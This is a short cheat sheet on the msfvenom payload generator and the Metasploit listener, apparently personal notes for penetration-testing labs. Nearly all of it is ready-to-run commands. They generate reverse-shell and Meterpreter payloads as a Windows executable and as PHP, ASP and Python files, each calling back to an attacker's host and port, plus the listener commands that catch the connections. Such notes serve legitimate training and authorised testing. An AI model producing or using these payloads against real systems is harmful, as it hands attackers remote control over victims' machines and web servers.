# Msfvenom

Standard syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`

Generate a Windows x64 Reverse Shell in an exe format:

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

* `f <format>`
  * Specifies the output format.
* `o <file>`
  * The output location and filename for the generated payload.
* `LHOST=<IP>`
  * Specifies the IP to connect back to.
* `LPORT=<port>`
  * The port on the local machine to connect back to.
  * This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

#### Payload Naming Conventions

`<OS>/<arch>/<payload>`

for example: `linux/x86/shell_reverse_tcp`

This would generate Windows 32bit targets: `windows/shell_reverse_tcp`

* Stageless payloads are denoted with underscores (\_).
* The staged equivalent to this payload would be: `shell/reverse_tcp`
* As staged payloads are denoted with another forward slash (/).

#### Meterpreter payload

`windows/x64/meterpreter/reverse_tcp`

`linux/x86/meterpreter_reverse_tcp`

#### Metasploit

First set:

`set PAYLOAD <payload>` `set LHOST <listen-address>` `set LPORT <listen-port>`

then:

`exploit -j` -j (job)

* Metasploit listening on a port under 1024 must be run with sudo permissions.

#### Reverse Payload

**Windows**

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`

**PHP**

`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`

**ASP**

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`

**Python**

`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
